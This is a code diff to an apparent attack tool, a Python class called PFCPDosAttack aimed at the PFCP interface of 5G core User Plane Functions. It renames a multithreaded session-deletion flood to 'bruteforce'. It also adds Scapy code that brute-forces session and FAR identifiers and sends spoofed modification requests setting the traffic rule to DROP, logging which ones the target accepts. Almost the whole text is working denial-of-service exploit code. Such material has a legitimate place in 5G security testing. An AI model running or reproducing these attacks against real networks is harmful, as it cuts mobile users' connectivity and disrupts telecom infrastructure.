@@ -545,7 +545,7 @@ class PFCPDosAttack:
             worker_logger.success(f"Worker finished flooding with {count} requests")
             
 
-    def pfcp_session_deletion_flood_worker(self, count, start_index=0):
+    def pfcp_session_deletion_bruteforce_worker(self, count, start_index=0):
         worker_logger = Log(f"[DoS][Worker-{start_index}]")
         if self.verbose:
             worker_logger.info(f"Worker starts flooding with {count} requests (offset {start_index})")
@@ -569,10 +569,10 @@ class PFCPDosAttack:
                 
                 
     
-    def Start_pfcp_session_deletion_flood(self, reqNbr=100, num_threads=1):
+    def Start_pfcp_session_deletion_bruteforce(self, reqNbr=100, num_threads=1):
 
         if self.verbose:
-            self.logger.info(f"Starting PFCP session deletion flood with {reqNbr} requests and {num_threads} threads")
+            self.logger.info(f"Starting PFCP session deletion bruteforce with {reqNbr} requests and {num_threads} threads")
             
 
         threads= []
@@ -583,7 +583,7 @@ class PFCPDosAttack:
         start_time = time.time()
         for i in range(num_threads):
             count = per_thread + (1 if i < remaining else 0)
-            t = threading.Thread(target=self.pfcp_session_deletion_flood_worker, args=(count, thread_offset))
+            t = threading.Thread(target=self.pfcp_session_deletion_bruteforce_worker, args=(count, thread_offset))
             t.start()
             threads.append(t)
             thread_offset += count
@@ -591,7 +591,7 @@ class PFCPDosAttack:
         for t in threads:
             t.join()
         if self.verbose:
-            self.logger.success(f"PFCP session deletion flood completed")
+            self.logger.success(f"PFCP session deletion bruteforce completed")
             
         end_time = time.time()
         duration = end_time - start_time
@@ -733,7 +733,48 @@ class PFCPDosAttack:
 ### SESSION DELETION ATTACK (DoS)
 objet_dos = PFCPDosAttack(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT)
 objet_dos.set_verbose(True)
-objet_dos.Start_pfcp_session_deletion_flood(reqNbr=int(sys.argv[1]), num_threads=int(sys.argv[2]))
+objet_dos.Start_pfcp_session_deletion_bruteforce(reqNbr=int(sys.argv[1]), num_threads=int(sys.argv[2]))
+
+def Update_FAR_DROP(far_id):
+
+    ie_update_far = IE_UpdateFAR(
+    IE_list=[
+        IE_FAR_Id(id=far_id),
+        IE_ApplyAction(DROP=1)
+        ]
+    )
+    ie_update_far = Raw(bytes(ie_update_far))
+    return ie_update_far
 
 
+def Build_PFCP_session_modification_req(seid, far_id, src_addr, dest_addr, src_port, dest_port):
+    
+    packet = PFCP(
+        version=1,
+        message_type=52,
+        S=1,
+        seid=seid,
+        seq=1
+    ) / Update_FAR_DROP(far_id)
+    packet = IP(src=src_addr, dst=dest_addr) / UDP(sport=src_port, dport=dest_port) / packet
+    packet = packet.__class__(bytes(packet))
+    return packet
 
+
+def Start_pfcp_session_modification_far_drop_bruteforce():
+    for seid in range(1, 100):
+        
+        for farId in range(1, 100):
+            packet = Build_PFCP_session_modification_req(seid=seid, far_id=farId, src_addr=EVIL_ADDR, dest_addr=UPF_ADDR, src_port=SRC_PORT, dest_port=DEST_PORT)
+            res = sr1(packet)
+            pfcp_cause = None
+            for ie in res[PFCP].IE_list:
+                if isinstance(ie, IE_Cause):
+                    pfcp_cause = ie.cause
+                    break
+            
+            if pfcp_cause == 1:
+                print(f"PFCP session modification request accepted; SEID: {hex(seid)}, FAR_ID: {hex(farId)}")
+    
+
+    
